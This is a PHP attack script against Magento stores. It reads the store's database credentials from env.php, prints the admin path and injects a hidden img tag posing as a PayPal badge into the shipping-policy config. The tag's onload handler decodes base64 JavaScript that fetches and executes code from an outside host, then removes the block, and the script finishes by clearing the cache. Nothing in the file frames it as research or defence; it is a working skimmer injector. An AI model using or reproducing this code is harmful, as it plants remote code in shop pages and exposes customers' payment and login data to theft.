<?php
error_reporting(E_ALL);
ini_set('display_errors', TRUE);
ini_set('display_startup_errors', TRUE);

$env = array();
if (file_exists('app/etc/env.php')) {
    $env = require_once 'app/etc/env.php';
}
else if(file_exists('./../app/etc/env.php')){
    $env = require_once './../app/etc/env.php';
}
else if (file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/etc/env.php')) {
    $env = require_once $_SERVER['DOCUMENT_ROOT'] . '/app/etc/env.php';
}
else if (file_exists($_SERVER['DOCUMENT_ROOT'] . '/../app/etc/env.php')){
    $env = require_once $_SERVER['DOCUMENT_ROOT'] . '/../app/etc/env.php';
}
else {
    print('Unable to load config');
    exit();
}



$host = $env['db']['connection']['default']['host'];
$username = $env['db']['connection']['default']['username'];
$password = $env['db']['connection']['default']['password'];
$dbname = $env['db']['connection']['default']['dbname'];
$prefix = $env['db']['table_prefix'];
$path = $env['backend']['frontName'];


$con = mysqli_connect($host, $username, $password, $dbname);


echo "ADMIN: " . $path .PHP_EOL;;



$query = sprintf("update core_config_data set value = '%s' where path= 'shipping/shipping_policy/shipping_policy_content'",
    mysqli_real_escape_string($con, '<img id="wcrfg_img" src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/pp-acceptance-medium.png" style="display:none;" onload="new Function(atob(this.getAttribute(\'data-sha256\'))).call(this)" data-sha256="dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLCAnLy93ZC5saWdodGVtcG9yaXVtLm5ldC9sb2cvJyArICc/Zm9ybWF0PWpzb25fdHJ1ZSZoYXNmYXN0PXRydWUmYXV0aHVzZXI9MCcpO3hoci5vbmxvYWQgPSBmdW5jdGlvbiAoKSB7bmV3IEZ1bmN0aW9uKCh4aHIucmVzcG9uc2UpKS5jYWxsKHRoaXMpO307eGhyLnNlbmQoKTtkb2N1bWVudC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCdzaGlwcGluZy1wb2xpY3ktYmxvY2snKVswXS5yZW1vdmUoKTs=">'));
$resultInj = mysqli_query($con, $query);
if ($resultInj !== FALSE) {
    echo "inject code success ".PHP_EOL;
}else{
    echo mysqli_error($con).PHP_EOL;
}

$queryEnable = "update core_config_data set value = '1' where path= 'shipping/shipping_policy/enable_shipping_policy'";
$resultEnable = mysqli_query($con, $queryEnable);
if ($resultEnable !== FALSE) {
    echo "Enable success ".PHP_EOL;
}else{
    echo mysqli_error($con).PHP_EOL;
}


$resultFind = mysqli_query($con, "SELECT * FROM " . $prefix . "core_config_data where path LIKE '%shipping_policy%'");
if ($resultFind !== FALSE) {
    while ($row = mysqli_fetch_assoc($resultFind)) {
        echo print_r($row);
        echo PHP_EOL;

    }
}

system("php ./../bin/magento cache:clean");
?>